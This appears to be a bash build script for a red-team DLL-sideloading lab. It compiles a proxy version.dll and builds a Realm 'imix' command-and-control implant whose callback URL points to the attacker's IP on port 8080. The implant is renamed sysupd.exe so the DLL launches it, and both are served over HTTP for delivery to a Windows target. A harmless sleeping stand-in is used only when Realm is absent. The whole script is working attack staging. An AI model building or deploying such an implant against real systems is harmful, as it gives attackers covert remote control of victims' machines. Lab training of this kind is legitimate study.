#!/usr/bin/env bash
# KALI - step 2+3: build the proxy version.dll (+ implant or benign stand-in) and serve.
# Usage:  ./kali-build.sh [KALI_IP]     e.g.  ./kali-build.sh 172.16.69.109
#         the given IP is baked into the implant callback (IMIX_CALLBACK_URI).
#         without an argument you are prompted (auto-detected IP as default).
set -e
PORT=8080
SERVE_PORT=8000
DETECTED=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.' | head -1)

if [ -n "$1" ]; then
    KALI_IP="$1"
    IP_SRC="from argument"
elif [ -t 0 ]; then
    read -p "Kali/Realm server IP to bake into the implant callback [${DETECTED}]: " KALI_IP
    KALI_IP="${KALI_IP:-$DETECTED}"
    IP_SRC="entered at prompt"
else
    KALI_IP="$DETECTED"
    IP_SRC="auto-detected (non-interactive)"
fi

# validate: a typo here would be permanently compiled into the implant
if ! [[ "$KALI_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    echo "[!] '$KALI_IP' is not a valid IPv4 address - aborting before build"; exit 1
fi
echo "[*] callback IP: ${KALI_IP} (${IP_SRC})"
echo "[*] implant callback will be baked in as: http://${KALI_IP}:${PORT}"
LAB=~/sideload-lab

echo "[*] lab dir: $LAB (proxy crate from poc-scripts/attacker/proxy-dll)"
mkdir -p $LAB
cp -r "$(dirname "$0")/../../poc-scripts/attacker/proxy-dll" $LAB/proxy-dll
cd $LAB/proxy-dll

echo "[*] building proxy version.dll (x86_64-pc-windows-gnu)..."
cargo zigbuild --release --target x86_64-pc-windows-gnu || {
    echo "[!] zigbuild failed, trying mingw fallback..."; cargo build --release --target x86_64-pc-windows-gnu; }
cp target/x86_64-pc-windows-gnu/release/proxy_dll.dll $LAB/version.dll
strip $LAB/version.dll 2>/dev/null || true

echo "[*] implant: building Realm imix if available, else benign stand-in..."
if [ -d ~/realm/implants/imix ]; then
    cd ~/realm/implants/imix
    IMIX_CALLBACK_URI=http://${KALI_IP}:${PORT} cargo build --release
    cp target/release/imix.exe $LAB/sysupd.exe
else
    echo "    (no ~/realm clone - creating benign stand-in: a script that just sleeps)"
    printf '# benign stand-in for the sideloading walkthrough\nwhile($true){Start-Sleep 5}\n' > $LAB/sysupd.exe.ps1
    printf '@echo off\n:loop\nping -n 10 127.0.0.1 > nul\ngoto loop\n' > $LAB/sysupd.bat
    echo "    NOTE: proxy DllMain spawns C:\\Users\\Public\\sysupd.exe - name your stand-in accordingly"
fi

echo "[*] serving on http://${KALI_IP}:${SERVE_PORT}/ (Ctrl+C to stop)"
cd $LAB && python3 -m http.server ${SERVE_PORT}
